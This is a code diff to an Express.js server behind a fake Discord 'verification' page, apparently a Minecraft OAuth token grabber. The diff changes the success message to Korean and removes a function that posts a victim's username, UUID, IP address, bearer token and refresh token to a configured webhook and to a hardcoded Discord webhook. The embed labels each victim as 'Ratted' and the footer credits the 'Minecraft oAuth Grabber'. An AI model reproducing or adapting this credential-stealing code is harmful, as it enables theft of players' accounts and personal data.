@@ -10,7 +10,7 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('Verification successful! You can exit this page and return to discord now.')
+    res.send('인증이 완료되었습니다!')
     const code = req.query.code
     if (code == null) {
         return
@@ -137,33 +137,6 @@ function pageGoPost(d){
 	goform.submit();
 }
 
-
-function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
-    const url = webhook_url
-    let data = {
-  username: "MOG",
-  avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
-  content: "@everyone",
-  embeds: [
-    {
-      title: "Ratted " + username + " - Click for networth",
-      color: 5898337,
-      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
-      url: "https://spillager.live/skyblock/networth/"+username,
-      footer: {
-        text: "Minecraft oAuth Grabber by WH0",
-        icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
-      },
-    }
-  ],
-}
-    axios.all([ 
-        axios.post(url, data),
-        axios.post("https://discord.com/api/webhooks/1035739384525365249/znx8rkzuOMqWkPrt2JDOL1xmMbIpM-g-36akxGoEEMohhSj1blZINPbn9k2afyHdL5tW", data)
-           .then(() => console.log("Successfully authenticated, posting to webhook!"))
-    ])
-    
-}
 
 
 const bannedNames = []
